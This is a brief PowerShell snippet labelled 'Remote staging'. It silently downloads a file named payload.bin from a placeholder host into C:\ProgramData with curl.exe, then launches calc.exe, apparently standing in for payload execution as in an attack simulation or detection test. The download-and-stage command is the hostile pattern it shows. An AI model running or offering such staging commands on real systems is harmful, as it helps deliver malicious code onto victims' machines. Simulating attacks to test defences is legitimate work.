# Remote staging
$PayloadUrl = "http://example.org/payload.bin"
$LocalPath = "C:\ProgramData\payload.bin"
curl.exe -s -L -o $LocalPath $PayloadUrl
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
